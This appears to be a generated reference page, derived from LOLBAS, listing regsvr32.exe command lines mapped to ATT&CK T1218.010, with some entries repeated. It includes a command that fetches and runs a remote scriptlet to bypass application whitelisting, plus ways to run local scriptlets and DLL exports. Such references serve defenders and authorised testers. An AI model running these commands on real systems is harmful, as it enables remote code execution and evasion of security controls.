---
parsed_by: focuslocust
source: commands
type: generated
---
# Regsvr32 Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Regsvr32.exe

Tool page: [Regsvr32.exe](../../tools/windows/regsvr32.exe.md)

### Execute code from remote scriptlet, bypass Application whitelisting

```text
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
```

Description:

Execute the specified remote .SCT script with scrobj.dll.

Related ATT&CK:

- [T1218.010](../../attack/techniques/T1218.010-regsvr32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Evidence | Command preserved from source parser. |

### Execute code from scriptlet, bypass Application whitelisting

```text
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
```

Description:

Execute the specified local .SCT script with scrobj.dll.

Related ATT&CK:

- [T1218.010](../../attack/techniques/T1218.010-regsvr32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Evidence | Command preserved from source parser. |

### Execute code from remote scriptlet, bypass Application whitelisting

```text
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
```

Description:

Execute the specified remote .SCT script with scrobj.dll.

Related ATT&CK:

- [T1218.010](../../attack/techniques/T1218.010-regsvr32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Evidence | Command preserved from source parser. |

### Execute code from scriptlet, bypass Application whitelisting

```text
regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
```

Description:

Execute the specified local .SCT script with scrobj.dll.

Related ATT&CK:

- [T1218.010](../../attack/techniques/T1218.010-regsvr32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Evidence | Command preserved from source parser. |

### Execute DLL file

```text
regsvr32.exe /s {PATH:.dll}
```

Description:

Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.

Related ATT&CK:

- [T1218.010](../../attack/techniques/T1218.010-regsvr32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Evidence | Command preserved from source parser. |

### Execute DLL file

```text
regsvr32.exe /u /s {PATH:.dll}
```

Description:

Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.

Related ATT&CK:

- [T1218.010](../../attack/techniques/T1218.010-regsvr32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Regsvr32.yml` |
| Evidence | Command preserved from source parser. |
